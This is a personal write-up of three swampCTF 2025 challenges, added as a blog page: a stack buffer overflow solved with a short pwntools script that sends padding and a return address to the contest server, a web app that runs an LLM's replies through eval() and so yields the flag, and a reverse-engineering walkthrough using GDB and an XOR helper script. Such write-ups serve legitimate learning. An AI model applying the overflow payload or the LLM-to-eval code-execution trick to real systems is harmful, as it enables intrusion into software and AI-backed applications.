@@ -1,0 +1,125 @@
+import Link from 'next/link'
+
+# Challenges
+- <Link href="#beginner-pwn-2">Beginner Pwn 2 (Pwn)</Link>
+- <Link href="#maybe-happy-ending-gpt">Maybe Happy Ending GPT (Web)</Link>
+- <Link href="#you-shall-not-passsss">You Shall Not Passsss (Rev)</Link>
+
+I love swampCTF. swampCTF 2024 was one of the first CTF's ive played and the first one where I felt immense satisfaction solving a challenge. A lot of high quality challenges all around, though it seems like this years was easier than last years.
+
+<h2 id="beginner-pwn-2">Beginner Pwn 2</h2>
+*Solved with Bentley*
+### Challenge Resources
+![beginnerpwn2](/ctfs/swampctf2025/beginnerpwn.webp)
+[Download](https://ctf.swampctf.com/files/ba73e4e10e45fd89e46dfc3842c14cbd/binary?token=eyJ1c2VyX2lkIjoxOTEsInRlYW1faWQiOjEwOCwiZmlsZV9pZCI6MjZ9.Z-oS_g.KjaTKth3XM4R_StKJgNkf2RbHQ8)
+### Solution
+1. We take a look at `checksec`
+![checksec](/ctfs/swampctf2025/checksec.webp)
+This is good. We have no PIE and no canary. Straightforwards
+2. Now, we try to find the return address
+![checksec](/ctfs/swampctf2025/retaddr.webp)
+Turns out the buffer size is 18, so anything afterwards is now the return statement.
+3. We get the correct script as:
+```
+import pwn
+
+r = pwn.remote("chals.swampctf.com", 40001)
+win_addr = 0x401186
+
+payload = b"A" * 18
+payload += pwn.p64(win_addr)
+r.sendline(payload)
+print(r.recvall().decode('latin-1'))  # Print flag
+r.close()
+```
+
+<h2 id="maybe-happy-ending-gpt">Maybe Happy Ending GPT</h2>
+
+### Challenge Resources
+![maybehappyending](/ctfs/swampctf2025/maybehappy.webp)
+[Web URL](http://chals.swampctf.com:50207/)
+[Download](https://ctf.swampctf.com/files/68f09c26e413cc219c7711c6e945d8fc/MaybeHappyEndingGPT.zip?token=eyJ1c2VyX2lkIjoxOTEsInRlYW1faWQiOjEwOCwiZmlsZV9pZCI6Mzd9.Z-oTmg.qLXXXrIORiDeBtnveM7ITCvmXr0)
+### Solution
+1. Search for references of `flag`
+![references](/ctfs/swampctf2025/references.webp)
+2. We see that there is a hint here, and that it is using eval()
+![eval](/ctfs/swampctf2025/eval.webp)
+3. It is reading the LLM's response and then evaluating it and returning the eval's output as a response
+4. ![ls](/ctfs/swampctf2025/ls.webp)
+5.![gptflag](/ctfs/swampctf2025/gptflag.webp)
+
+<h2 id="you-shall-not-passsss">You Shall Not Passsss</h2>
+### Challenge Resources
+![youshalnotpass](/ctfs/swampctf2025/youshalnotpass.webp)
+[Download](https://ctf.swampctf.com/files/10ed11c19ea792d32db42fe63d217274/chal?token=eyJ1c2VyX2lkIjoxOTEsInRlYW1faWQiOjEwOCwiZmlsZV9pZCI6OX0.Z-oU4Q.PAkwNhds6tYYtyuL1FBr838q7Fw)
+### Solution
+1. We first decompile with binary ninja
+2. In the main function, We allocate 3 pointers and 1 variable, change a variable until its non-zero, do a lot more assignments to variables from constants loaded within memory, and perform a hashing function for each of them (there are like 20 of thes variables). Another loop of a pointer, and then we run the 2nd function
+	1. ![libcmain](/ctfs/swampctf2025/libcmain.webp)
+	2. ![3alloca](/ctfs/swampctf2025/3alloca.webp)
+	3. ![nonzero](/ctfs/swampctf2025/nonzero.webp)
+	4. ![lastassgn](/ctfs/swampctf2025/lastassgn.webp)
+3. The second function is a lot more interesting. It constructs a list, with the first element as a function. Then, it calls that function.
+![2ndfunc](/ctfs/swampctf2025/2ndfunc.webp)
+
+##### Debugging
+So, the function data is dynamicaly loaded. We debug to see whats going on.
+- Enter libc_start_main
+- Continue until we enter main which is here:
+![gdb1](/ctfs/swampctf2025/gdb1.webp)
+- Step into that call, then keep moving until we call rax. Our entry is at `0x5555555550c0`. This is what it looks like:
+![gdb2](/ctfs/swampctf2025/gdb2.webp)
+- It iterates through a loop, and it runs in it for __ times.
+- Afterwards, it gradually pushes the word `Incorrect\n` onto the memory locations
+![gdb3](/ctfs/swampctf2025/gdb3.webp)
+- Then, it writes `Correct!\n` to the memory space afterwards
+![gdb4](/ctfs/swampctf2025/gdb4.webp)
+- Afterwards, save some data to the heap
+![gdb5](/ctfs/swampctf2025/gdb5.webp)
+- Enter a loop that repeats 181 times,
+- Write the data, then jump into the next call. 
+![gdb6](/ctfs/swampctf2025/gdb6.webp)
+- Then, it tries to mmap, and it will jump out if it fails.
+- It will then move some string contents into registers
+![gdb6](/ctfs/swampctf2025/gdb7.webp)
+- Moves some more things around
+- Moves in some constants, then calls rbp 
+![gdb6](/ctfs/swampctf2025/gdb8.webp)
+- Inside rbp: string constants and data is being loaded
+![gdb6](/ctfs/swampctf2025/gdb9.webp)
+- Enters a loop that runs 38 times
+![gdb6](/ctfs/swampctf2025/gdb10.webp)
+- It should have a conditional move that occurs when dil is equal to r8b
+![gdb6](/ctfs/swampctf2025/gdb11.webp)
+**This is the key.**
+- Initially, before the start of the loop, rbx is `Correct!\n`
+![gdb6](/ctfs/swampctf2025/gdb12.webp)
+- After the loop, if esi is 0, then the value at r14 (which is `Incorrect`) is moved into rbx, then it prints rbx.
+![gdb6](/ctfs/swampctf2025/gdb13.webp)
+	- ![gdb6](/ctfs/swampctf2025/gdb14.webp)
+	- ![gdb6](/ctfs/swampctf2025/gdb15.webp)
+	- If this comparison is not equal, then we will have to cmov
+	- so, this comparison must be equal all 36 times
+- Setting the first character to `s` passes the first check, so we know that it is decoding now character by character. Also, changing characters does not modify the `r8b` values, so these are constant.
+- Now, we know that it loads the character into `dil`, xors it with `al` and compares it to be `r8b`. So, we should be able to find the character from the expected `r8b` values and `al` values.
+- I have a script to help me calculate the next character, since I did not want to reverse engineer the encryption process
+```python
+def find_a(b_hex, c_hex):
+  b_int = int(b_hex, 16)  # Convert b from hex to integer
+  c_int = int(c_hex, 16)  # Convert c from hex to integer
+  a_int = c_int ^ b_int  # Perform the XOR operation
+  a_hex = hex(a_int)  # Convert a back to hexadecimal
+  return a_hex
+
+b_decimal = int(input('b_decimal: '))
+b_hex = hex(b_decimal & 0xFF) #ensure 8 bit representation.
+c_hex = input("c_hex: ")
+
+result_hex = int(find_a(b_hex, c_hex), 16)
+print(f"a = {result_hex}, chr(a) = {chr(result_hex)}")
+```
+Kept on running the script until i got the flag
+<video width="600" height="600" controls>
+  <source src="/ctfs/swampctf2025/flaginputs.mp4" type="video/mp4"/>
+</video>
+`swampCTF{531F_L0AD1NG_T0TALLY_RUL3Z}`
